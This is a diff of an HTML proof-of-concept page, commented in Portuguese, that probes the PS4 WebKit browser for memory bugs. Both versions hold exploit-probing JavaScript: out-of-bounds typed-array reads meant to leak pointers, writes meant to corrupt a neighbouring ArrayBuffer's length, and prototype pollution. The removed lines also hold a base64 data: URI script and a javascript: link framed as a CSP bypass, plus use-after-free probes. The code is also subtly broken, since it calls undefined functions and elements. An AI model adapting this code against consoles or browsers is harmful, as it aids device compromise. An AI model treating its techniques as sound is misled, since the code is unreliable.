@@ -2,291 +2,192 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit PoC - Exploração Direcionada v2</title>
+    <title>PS4 WebKit PoC - Refined Probes v9</title>
     <style>
         /* Estilos CSS */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
         #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        /* Outros estilos .log-* mantidos */
         .log-info { color: #6cf; }
         .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
         .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho vivo */
-        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks potenciais */
+        .log-vuln { color: #ff4444; font-weight: bold; }
+        .log-leak { color: #FF9800; font-weight: bold; }
+        .log-ptr { color: #f0f; font-weight: bold; }
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
     </style>
 </head>
 <body>
-    <h1>PS4 WebKit PoC - Tentativas de Exploração Direcionada v2</h1>
-    <p>AVISO: Script final complexo. Pode ser lento e/ou travar. Observe o log.</p>
+    <h1>PS4 WebKit PoC - Refined Probes v9</h1>
+    <p>Foco: Testar Info Leak perto do início e Corrupção de Length via Offsets Negativos (Variações).</p>
+    <p style="color: red; font-weight: bold;">AVISO: BAIXA PROBABILIDADE DE SUCESSO. ALTO RISCO DE CRASH.</p>
     <div id="poc-output"></div>
+    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;"></div>
 
     <script>
-        let outputDiv = document.getElementById('poc-output'); // Make it reassignable in case of error
-        const log = (message, type = 'info') => {
-            // Função log
-            if (!outputDiv) return; // Se sumir, parar de logar
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}] `;
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                // Limitar tamanho do log para evitar travar o navegador apenas pelo log
-                if (outputDiv.innerHTML.length > 500000) {
-                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
-                    outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
-                }
-                outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${sanitizedMessage}\n</span>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-             } catch (e) {
-                 console.error("Erro fatal no logging ou div sumiu:", e);
-                 outputDiv = null; // Desativar logging
-             }
+        let outputDiv = document.getElementById('poc-output');
+        const log = (message, type = 'info') => { /* ... Função log igual anterior ... */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
+        const PAUSE_DURATION = 200;
+        const SHORT_PAUSE = 30;
+
+        // --- Teste 1 (Entry Point Check - Mantido) ---
+        const runCSP_XSS_Check = () => {
+            log("--- T1: Verificação de Entrada XSS ---",'test');
+             // Apenas log para confirmar que JS está rodando
+             log("Execução de JS via XSS/CSP Bypass está funcionando.", 'good');
+             log("--- T1 Concluído ---",'test');
         };
 
-        const PAUSE_DURATION = 300; // Pausa ainda mais curta
+        // --- NOVO Teste 2: OOB Read Near Start (Baseado na sua descrição) ---
+        const runOOBReadNearStart = async () => {
+            log("--- T2: OOB Read Near Start (-16 to +16) ---", 'test');
+            log("Objetivo: Ler OOB perto do INÍCIO do buffer com DataView.", 'warn');
 
-        // --- Funções de Teste Atualizadas/Novas ---
+            const bufferSize = 128;
+            let buffer = null, dataView = null;
+            let potentialLeakFound = false;
 
-        // Teste 1: OOB Write + Tentativa de Info Leak Avançada (Múltiplos Tipos, Leitura Larga)
-        const runOOBLeakAdvanced = async () => {
-            log("--- Iniciando Teste 1: OOB Write + Advanced Info Leak ---", 'test');
             try {
-                const bufferSize = 128; // Buffer maior
-                const buffer = new ArrayBuffer(bufferSize);
-                const u8view = new Uint8Array(buffer);
-                const u32view = new Uint32Array(buffer);
-                const f64view = new Float64Array(buffer);
-                const dataView = new DataView(buffer); // Usar DataView para leitura mais controlada
+                buffer = new ArrayBuffer(bufferSize);
+                dataView = new DataView(buffer);
+                log("  Buffer alocado.", 'info');
 
-                const writeOffset = bufferSize; // Escrever logo após o buffer
-                const writeValue = 0xAA;
-                log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
-                try {
-                    u8view[writeOffset] = writeValue;
-                    log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} bem-sucedida!`, 'vuln');
+                // Offsets relativos ao INÍCIO do buffer (índice 0)
+                const readOffsets = [-16, -12, -8, -4, 0, 4, 8, 12, 16];
 
-                    const leakOffsetBytes = writeOffset; // Ler onde escrevemos (ou perto)
-                    const readLength = 64; // Ler muitos bytes/elementos (512 bytes total)
-                    log(`Tentando Info Leak OOB a partir de ${leakOffsetBytes} (bytes) lendo ${readLength*8} bytes...`, 'subtest');
-                    let foundPotentialLeak = false;
-
-                    for (let i = 0; i < readLength * 8; i++) { // Iterar byte a byte
-                         const currentByteOffset = leakOffsetBytes + i;
-                         // Ler como U8
-                         try { const val = u8view[currentByteOffset]; if(val !== undefined && val !== 0){ log(`  Leak U8[${currentByteOffset}]: 0x${val.toString(16)}`, 'leak'); foundPotentialLeak = true;} } catch(e){}
-
-                         // Ler como U32 se alinhado
-                         if (currentByteOffset % 4 === 0) {
-                             try { const val32 = dataView.getUint32(currentByteOffset, true); if(val32 !== undefined && val32 !== 0){ log(`  Leak U32[${currentByteOffset/4}]: 0x${val32.toString(16)}`, 'leak'); foundPotentialLeak = true; if(val32 > 0xFFFF && val32 !== 0xFFFFFFFF) log(`    >> Potencial Ponteiro/Dado!`, 'vuln');} } catch(e){}
-                         }
-                         // Ler como F64 se alinhado
-                          if (currentByteOffset % 8 === 0) {
-                             try { const val64 = dataView.getFloat64(currentByteOffset, true); if(!isNaN(val64) && val64 !== 0){ log(`  Leak F64[${currentByteOffset/8}]: ${val64}`, 'leak'); foundPotentialLeak = true; log(`    >> Potencial Float/Dado!`, 'vuln');} } catch(e){}
-                          }
-                         // Adicionar pequena pausa para não sobrecarregar
-                         if (i % 64 === 0) await new Promise(resolve => setTimeout(resolve, 10));
-                    }
-
-                    if (!foundPotentialLeak) { log("Nenhum dado OOB não-zero/válido encontrado nesta leitura extensa.", 'info');}
-
-                } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
-            } catch (e) { log(`Erro GERAL no teste OOB Leak Adv: ${e.message}`, 'warn'); }
-            log("--- Teste 1 Concluído ---", 'test');
-        };
-
-        // Teste 2: OOB Write visando Corrupção de Objeto Adjacente
-        const runOOBCorruptAdjacent = async () => {
-             log("--- Iniciando Teste 2: OOB Write visando Corrupção de Objeto Adjacente ---", 'test');
-             try {
-                 log("Alocando Buffer de Ataque e Objeto Alvo...", 'info');
-                 let targetObject = { id: 12345, name: "Target", value: 5.5, active: true };
-                 let attackBuffer = new ArrayBuffer(32);
-                 let attackView = new Uint8Array(attackBuffer);
-                 const originalTargetState = JSON.stringify(targetObject);
-                 log(`Objeto alvo inicial: ${originalTargetState}`, 'info');
-
-                 const oobOffset = 32; const writeLength = 16;
-                 const valuesToWrite = [0, 0xFF, 0x41, 0x42, 0x43, 0x44]; // Testar mais valores ASCII
-
-                 for(const value of valuesToWrite){
-                     log(`Tentando escrita OOB (valor=0x${value.toString(16)}) em offsets ${oobOffset}-${oobOffset+writeLength-1} visando objeto...`, 'subtest');
+                log(`  Lendo OOB nos offsets (bytes): ${readOffsets.join(', ')} relativos ao início...`, 'info');
+                for (const offset of readOffsets) {
+                     // Ler como U32
                      try {
-                        for (let i=0; i<writeLength; i++){ attackView[oobOffset + i] = value; }
-                        log(`Escrita OOB realizada. Verificando objeto alvo...`, 'info');
-                        let changed = false;
-                        try {
-                            // Verificar serializando
-                            if (JSON.stringify(targetObject) !== originalTargetState) {
-                                log(`VULNERÁVEL: Estado do targetObject alterado! Original=${originalTargetState}, Atual=${JSON.stringify(targetObject)}`, 'vuln');
-                                changed = true;
-                            }
-                            // Verificar acesso a propriedades individuais
-                            if (targetObject.id !== 12345 || targetObject.name !== "Target" || targetObject.value !== 5.5 || targetObject.active !== true) {
-                                if(!changed) log(`VULNERÁVEL: Propriedade(s) do targetObject alterada(s)!`, 'vuln');
-                                changed = true;
-                            }
-                         } catch (e) {
-                              log(`VULNERÁVEL: Erro ao acessar/serializar targetObject após OOB write! ${e.message}`, 'vuln');
-                              changed = true; // Considerar erro como sinal de corrupção
+                         const val32 = dataView.getUint32(offset, true);
+                         if (val32 !== undefined && val32 !== 0) {
+                             const isPtrLike = val32 > 0xFFFF && val32 !== 0xFFFFFFFF;
+                             log(`    Leak U32 @${offset}: 0x${val32.toString(16).padStart(8, '0')}`, isPtrLike ? 'ptr' : 'leak');
+                             if (isPtrLike) { potentialLeakFound = true; log(`      >> Potencial Ponteiro/Dado!`, 'vuln');}
                          }
-                        if (!changed) { log(`Nenhuma corrupção óbvia detectada no objeto alvo com valor 0x${value.toString(16)}.`, 'info'); }
-                        // Resetar o objeto alvo
-                        targetObject = JSON.parse(originalTargetState);
+                     } catch (e) { if(offset < 0 || offset >= bufferSize) { /* Erro esperado OOB */ } else { log(`    Erro inesperado U32 @${offset}: ${e.message}`, 'error'); } }
 
-                     } catch (writeError) { log(`✅ Escrita OOB bloqueada/erro: ${writeError.message}`, 'good'); break; }
-                     await new Promise(resolve => setTimeout(resolve, 50));
-                 }
-             } catch (e) { log(`Erro GERAL no teste OOB Corrupt Adj: ${e.message}`, 'warn'); }
-             log("--- Teste 2 Concluído ---", 'test');
-        };
-
-        // Teste 3: Prototype Pollution + Tentativa de Impacto em Função
-        const runPPFunctionImpact = () => {
-            log("--- Iniciando Teste 3: Prototype Pollution + Impacto em Função ---", 'test');
-            const pollutionKey = 'map'; const originalMap = Array.prototype.map;
-            let pollutionSuccess = false;
-            try {
-                const pollutionValue = function(...args) { log(`VULNERÁVEL: Array.prototype.map POLUÍDO foi chamado!`, "vuln"); return ["polluted"]; };
-                log(`Tentando poluir Array.prototype['${pollutionKey}']...`, 'info');
-                Array.prototype[pollutionKey] = pollutionValue;
-                 if (Array.prototype.map === pollutionValue && [].map === pollutionValue) {
-                     log("Poluição de .map parece bem-sucedida.", 'info'); pollutionSuccess = true;
-                     log("Chamando [1, 2].map(x => x * 2)...", 'subtest');
+                     // Ler como F64
                      try {
-                         let result = [1, 2].map(x => x * 2);
-                         log(`Resultado da chamada map: ${JSON.stringify(result)}`, 'warn');
-                         if(JSON.stringify(result) === JSON.stringify(["polluted"])) { log("Confirmação: Chamada usou função poluída!", 'vuln'); }
-                     } catch (mapError) { log(`Erro ao chamar .map poluído: ${mapError.message}`, 'error'); }
-                 } else { log("Falha ao poluir Array.prototype.map.", 'warn'); }
-            } catch (e) { log(`Erro GERAL no teste PP Function Impact: ${e.message}`, 'warn');
-            } finally {
-                 if (pollutionSuccess) { log("Restaurando Array.prototype.map original...", 'info'); Array.prototype.map = originalMap; if (Array.prototype.map === originalMap) { log("Restauração ok.", 'good'); } else { log("FALHA restaurar .map!", 'error'); }}
-            }
-            log("--- Teste 3 Concluído ---", 'test');
-        };
-
-
-        // Teste 4: CSP Bypass + Payload Avançado (Chama Info Leak Probe)
-        const runCSPAdvancedPayload = () => {
-            log("--- Iniciando Teste 4: CSP Bypass + Payload Avançado (Leak Probe) ---", 'test');
-            log("Tentando carregar payload (Info Leak Probe) via data: URI...", 'info');
-            try {
-                // Payload JS que chama uma versão simplificada do leak probe
-                const payloadJS = `
-                    log("[Payload CSP] Iniciando Info Leak Probe...", "warn");
-                    async function probe() {
-                         try {
-                             const buf = new ArrayBuffer(64); const u8 = new Uint8Array(buf); const dv = new DataView(buf);
-                             u8[64] = 0xCC; // Trigger OOB Write
-                             log("[Payload CSP] OOB Write OK. Lendo OOB...", 'info');
-                             let found = false;
-                             for(let i=0; i<16; i++) { // Ler 16 * 8 = 128 bytes OOB
-                                 const offset = 64 + i*8;
-                                 try { const lo = dv.getUint32(offset, true); const hi = dv.getUint32(offset+4, true); if(lo!==0 || hi!==0) {log(\`[Payload CSP] Leak U64 @\${offset}: H=0x\${hi.toString(16)} L=0x\${lo.toString(16)}\`, 'leak'); found=true;} } catch(e){}
-                                 try { const f = dv.getFloat64(offset, true); if(!isNaN(f) && f!==0) {log(\`[Payload CSP] Leak F64 @\${offset}: \${f}\`, 'leak'); found=true;} } catch(e){}
+                        // Ler apenas se o offset for válido e alinhado a 8 bytes
+                        if (offset >= -bufferSize && offset <= bufferSize - 8 && offset % 8 === 0) {
+                             const val64 = dataView.getFloat64(offset, true);
+                              if (!isNaN(val64) && val64 !== 0) {
+                                 log(`    Leak F64 @${offset}: ${val64}`, 'leak');
+                                 potentialLeakFound = true; log(`      >> Potencial Float/Dado!`, 'vuln');
                              }
-                             if(!found) log("[Payload CSP] Nenhum leak suspeito encontrado.", 'info');
-                         } catch(e) { log("[Payload CSP] Erro no probe: " + e.message, "error");}
-                         log("[Payload CSP] Probe concluído.", "warn");
-                    }
-                    // Chamar probe async
-                    probe();
-                `;
-                const encodedPayload = btoa(payloadJS);
-                const scriptTag = document.createElement('script');
-                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
-                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: com payload!", 'error');};
-                document.body.appendChild(scriptTag);
-                 log("Tag script com payload Info Leak adicionada.", 'info');
-            } catch (e) { log(`Erro ao criar payload data:: ${e.message}`, 'warn'); }
-             log("Tentando injetar link javascript: URI (Alert)...", 'info'); // Manter link simples
-             try {
-                const jsLink = document.createElement('a');
-                jsLink.href = "javascript:log('VULNERÁVEL: Bypass CSP link clicado!','vuln');try{alert('CSP Link Bypass!');}catch(e){log('Alerta bloqueado JS URI','warn');}";
-                jsLink.textContent = "[Clique AQUI Teste JS URI (Alert)]";
-                jsLink.style.cssText='display:block;margin:10px;padding:5px;border:1px solid orange;color:orange;';
-                const placeholder = document.getElementById('js-link-placeholder'); // Assuming placeholder exists from previous tests
-                if(placeholder) placeholder.replaceWith(jsLink); else document.body.appendChild(jsLink); // Add if needed
-                log("Link JS URI adicionado.", 'warn');
-            } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
-            log("--- Teste 4 Concluído ---", 'test');
-        };
+                        }
+                     } catch (e) { if(offset < 0 || offset >= bufferSize) { /* Erro esperado OOB */ } else { log(`    Erro inesperado F64 @${offset}: ${e.message}`, 'error'); } }
 
-        // Teste 5: Prototype Pollution Básico (Confirmação)
-        const runPPBasic = () => { /* Mantido igual (Teste 5 anterior) */
-             log("--- Iniciando Teste 5: PP Básico (Confirmação) ---", 'test'); const k='__pp_test_confirm__',v='PPOK';try{log(`Poluindo['${k}']...`,'info');Object.prototype[k]=v;const t={'w':window,'n':{}};let c=0;for(const n in t){try{if(t[n]&&t[n][k]===v){log(`VULN: PP básica OK! ${n}.${k}=${t[n][k]}`,'vuln');c++;}}catch(e){}} if(c>0)log(`Confirmado:${c} obj(s).`,'vuln');else log(`Aviso:Ñ confirmou PP.`,'warn'); try{delete Object.prototype[k];log("Limpou PP.",'info');}catch(e){}}catch(e){} log("--- Teste 5 Concluído ---",'test');
-        };
+                     await new Promise(r => setTimeout(r, SHORT_PAUSE / 2)); // Pequena pausa entre offsets
+                 } // Fim loop leitura OOB
 
-        // Teste 6: OOB Write Básico (Confirmação Rápida)
-        const runOOBTestU8_Confirm = async () => {
-            log("--- Iniciando Teste 6: OOB Write (Uint8 Confirmação) ---", 'test');
-            try {const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,20));}}catch(e){} log("--- Teste 6 Concluído ---", 'test');
-        };
-
-
-        // --- Testes Mantidos para Logs Abrangentes (Opcional remover) ---
-
-        // Teste 7: Use-After-Free (UAF) Básico + SVG
-        const runUAFTests = async () => { /* Mantido igual (Teste 6 anterior) */
-             log("--- Iniciando Teste 7: UAF Básico + SVG ---", 'test');
-             log("C1: Nó DOM.", 'subtest'); let r1=null; try { let p=document.createElement('div'), c=document.createElement('span'); p.appendChild(c); document.body.appendChild(p); r1=c; log("DOM Add ok.",'info'); p.removeChild(c); document.body.removeChild(p); p=null; c=null; log("DOM Rem ok. GC...",'info'); try{new ArrayBuffer(5*1024*1024);}catch(e){} await new Promise(r=>setTimeout(r,100)); log("Tentando DOM ref.tagName...",'info'); let tn=r1.tagName; log(`tagName ok:${tn}`,'warn'); log("Tentando DOM ref.getBCR...",'info'); r1.getBoundingClientRect(); log(`getBCR ok.`,'warn'); } catch(e){log(`ERRO (Pot. UAF DOM):${e.message}`,'vuln');} finally{r1=null;}
-             log("C2: Nó SVG.", 'subtest'); let r2=null; const ns="http://www.w3.org/2000/svg"; try { let p=document.createElementNS(ns,"svg"), c=document.createElementNS(ns,"rect"); p.appendChild(c); document.body.appendChild(p); r2=c; log("SVG Add ok.",'info'); p.removeChild(c); document.body.removeChild(p); p=null; c=null; log("SVG Rem ok. GC...",'info'); try{new ArrayBuffer(5*1024*1024);}catch(e){} await new Promise(r=>setTimeout(r,100)); log("Tentando SVG ref.id...",'info'); let id=r2.id; log(`id ok:${id}`,'warn'); log("Tentando SVG ref.getBBox...",'info'); r2.getBBox(); log(`getBBox ok.`,'warn'); } catch(e){log(`ERRO (Pot. UAF SVG):${e.message}`,'vuln');} finally{r2=null;}
-             log("--- Teste 7 Concluído ---", 'test');
-         };
-
-        // Teste 8: Type Confusion Básico + APIs
-        const runTypeConfusionTests = () => { /* Mantido igual (Teste 7 anterior) */
-            log("--- Iniciando Teste 8: TC Básico + APIs ---", 'test');
-            log("C1&2: DOM/toFixed", 'subtest'); try{window.postMessage(window,"*");log("postMsg ok",'good');}catch(e){log(`Erro postMsg:${e.message}`,'warn');} try{document.dispatchEvent({t:'c'});log("dispatchEv ok",'good');}catch(e){log(`Erro dispEv:${e.message}`,'warn');} try{let p=5,o=new Number(5);let r=p.toFixed(o);log(`.toFixed ok:${r}`,'good');}catch(e){log(`ERRO (.toFixed TC?):${e.message}`,'vuln');}
-            log("C3: IndexedDB", 'subtest'); if(window.indexedDB){try{log("idxDB.open(123)",'info');window.indexedDB.open(123,1);log("idxDB sem erro",'warn');}catch(e){log(`Erro idxDB:${e.message}`,'good');}}else{log("idxDB N/A",'info');}
-            log("C4: WebSocket", 'subtest'); if(window.WebSocket){try{log("new WS(123)",'info');new window.WebSocket(123);log("WS sem erro",'warn');}catch(e){log(`Erro WS:${e.message}`,'good');}}else{log("WS N/A",'info');}
-            log("--- Teste 8 Concluído ---", 'test');
-        };
-
-        // Teste 9: OOB Crash Probe
-        const runOOBCrashProbe = async () => { /* Mantido igual (Teste 9 anterior) */
-            log("--- Iniciando Teste 9: OOB Crash Probe ---", 'test');
-            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 2000)); // Menor pausa
-            try { const b=new ArrayBuffer(32),v=new Uint8Array(b); const o=-25000; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=0xFE; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn'); }
-            catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); } log("--- Teste 9 Concluído (se não travou) ---", 'test');
-        };
-
-
-        // --- Função Principal de Execução ---
-        const runAllTests = async () => {
-            log("Iniciando testes de PoC (Info Leak Focus v3)..."); // Atualizar nome
-            const tests = [
-                runOOBLeakAdvanced,     // Teste 1 - Leak perto do início (Refinado)
-                runOOBCorruptLength,     // Teste 2 - Corromper Length (Refinado)
-                runCSPTest,              // Teste 3 - CSP (Mantido)
-                runPPBasic,              // Teste 4 - PP (Confirmar) (Mantido)
-                // Remover testes que foram inconclusivos ou menos relevantes?
-                // runUAFTests,              // Teste X - UAF Básico
-                // runTypeConfusionTests,    // Teste Y - TC Básico
-                // runEnvironmentProbing,    // Teste Z - Env Probe
-                runOOBCrashProbe         // Teste 5 - Crash Probe (Opcional)
-            ];
-             // Atualizar contagem total
-             const totalTests = tests.length;
-             log(`Total de ${totalTests} testes principais na sequência.`);
-
-            for(let i=0; i < tests.length; i++){
-                 if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
-                 try {
-                     log(`--- EXECUTANDO TESTE ${i+1}/${totalTests} ---`, 'test'); // Usar totalTests
-                     const testFn = tests[i]; const result = testFn();
-                     if (result instanceof Promise) { await result; }
-                 } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
-                 if (i < tests.length - 1 && outputDiv) {
-                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
+                 if (!potentialLeakFound) {
+                     log("  Nenhum leak promissor encontrado nos offsets testados perto do início.", 'info');
                  }
-            }
-            if(outputDiv) log("\n\nTodos os testes PoC INFO LEAK v3 concluídos (se não travou).", 'test'); // Atualizar nome
-            else console.error("Script concluído, mas div log não disponível.");
+
+            } catch (e) { log(`  Erro GERAL no Teste 2: ${e.message}`, 'error'); }
+            finally { buffer = null; dataView = null; }
+            log("--- T2 Concluído ---", 'test');
         };
 
-        document.addEventListener('DOMContentLoaded', runAllTests);
+        // --- NOVO Teste 3: Corrupt Length via Negative Offset (Baseado na sua descrição) ---
+        const runOOBCorruptLengthNeg = async () => {
+            log("--- T3: Corrupt Length via Negative Offset ---", 'test');
+            log("Objetivo: Escrever OOB em offsets negativos (-16 a -4) para corromper byteLength.", 'warn');
+            log("RISCO DE CRASH!", 'crash');
 
+            const bufferSize = 128; // Tamanho atacante e vítima
+            const negativeOffsets = [-16, -12, -8, -4]; // Offsets a testar relativos ao FIM do atacante
+            const valuesToWrite = [0xFFFFFFFF, 0x1000]; // Valores a escrever (32 bits)
+
+            for (const writeOffsetRelativeToEnd of negativeOffsets) {
+                for (const value32 of valuesToWrite) {
+                    log(`Testando: Escrita OOB @${writeOffsetRelativeToEnd} val ${value32.toString(16)}`, 'subtest');
+                    let attackerBuffer = null, victimBuffer = null, attackerViewU8 = null;
+                    let success = false;
+
+                    try {
+                        attackerBuffer = new ArrayBuffer(bufferSize);
+                        victimBuffer = new ArrayBuffer(bufferSize); // Vítima
+                        attackerViewU8 = new Uint8Array(attackerBuffer);
+                        const originalVictimLength = victimBuffer.byteLength;
+                        log(`  Buffers alocados. Tam. original vítima: ${originalVictimLength}.`, 'info');
+
+                        // Calcular offset absoluto relativo ao início do atacante
+                        const absoluteWriteOffset = attackerBuffer.byteLength + writeOffsetRelativeToEnd;
+
+                        log(`  Tentando escrever valor ${value32.toString(16)} via OOB (U8) no offset abs ${absoluteWriteOffset}...`, 'info');
+
+                        // Usar Uint8Array para escrever 4 bytes (valor 32 bits)
+                        try {
+                            // Escrever LSB primeiro (Little Endian)
+                            attackerViewU8[absoluteWriteOffset + 0] = (value32 >> 0) & 0xFF;
+                            attackerViewU8[absoluteWriteOffset + 1] = (value32 >> 8) & 0xFF;
+                            attackerViewU8[absoluteWriteOffset + 2] = (value32 >> 16) & 0xFF;
+                            attackerViewU8[absoluteWriteOffset + 3] = (value32 >> 24) & 0xFF;
+                            log("  Escrita OOB de 4 bytes realizada. Verificando tamanho...", 'good');
+
+                            // Verificar tamanho da vítima
+                            const currentVictimLength = victimBuffer.byteLength;
+                            log(`  Tamanho ATUAL da vítima: ${currentVictimLength}`, (currentVictimLength !== originalVictimLength) ? 'vuln' : 'info');
+
+                            if (currentVictimLength !== originalVictimLength && currentVictimLength !== 0) { // Checar se != 0 também
+                                log("    >> SUCESSO? Tamanho da Vítima parece ter mudado! <<", 'vuln');
+                                success = true;
+                            } else {
+                                log("    Falha: Tamanho da vítima não mudou.", 'warn');
+                            }
+                        } catch (e) {
+                             log(`  Escrita OOB @${absoluteWriteOffset} falhou (provavelmente esperado para < -8): ${e.message}`, 'warn');
+                             // Não considerar erro de escrita como falha do teste, mas sim do offset
+                        }
+                    } catch (e) { log(`  Erro GERAL no subteste: ${e.message}`, 'error'); }
+                    finally { attackerBuffer = null; victimBuffer = null; attackerViewU8 = null;} // GC help
+
+                    if(success) break; // Parar se um offset/valor funcionou
+                     await new Promise(r => setTimeout(r, SHORT_PAUSE));
+                 } // Fim loop valores
+                 if(success) break; // Parar se um offset/valor funcionou
+             } // Fim loop offsets
+            log("--- T3 Concluído ---", 'test');
+        };
+
+
+        // --- Teste 4: OOB Write Confirm (Mantido - Base) ---
+        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v8 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };
+
+        // --- Função Principal ---
+        const runAll = async () => {
+             displayUserAgent();
+             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
+            log("Iniciando todos os testes (REFINED PROBES v9)...");
+            const tests = [ // Sequência atualizada
+                runCSP_XSS_Check,               // T1: Verificação XSS/Entrada
+                runOOBReadNearStart,            // T2: OOB Read Perto do Início (NOVO)
+                runOOBCorruptLengthNeg,         // T3: Corrupt Length Neg Offset (NOVO)
+                runOOBTestU8_Confirm,           // T4: OOB Confirm Base (Renumerado)
+            ];
+             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v8 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
+            if(outputDiv) log("\n\nTodos os testes REFINED PROBES v9 concluídos.", 'test');
+            else console.error("Script concluído, div log NULO.");
+             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
+        };
+
+        // Adicionar controles manuais atualizados
+        document.getElementById('controls').innerHTML = `
+            <button onclick="runCSP_XSS_Check()">Rodar T1 (Check XSS)</button>
+            <button onclick="runOOBReadNearStart()">Rodar T2 (OOB Read Start)</button>
+            <button onclick="runOOBCorruptLengthNeg()">Rodar T3 (Length Corr Neg)</button>
+            <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
+            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
+        `; // Removido link JS desnecessário
+
+        displayUserAgent();
+        // Opcional: Rodar tudo automaticamente
+        // document.addEventListener('DOMContentLoaded', runAll);
     </script>
 
 </body>
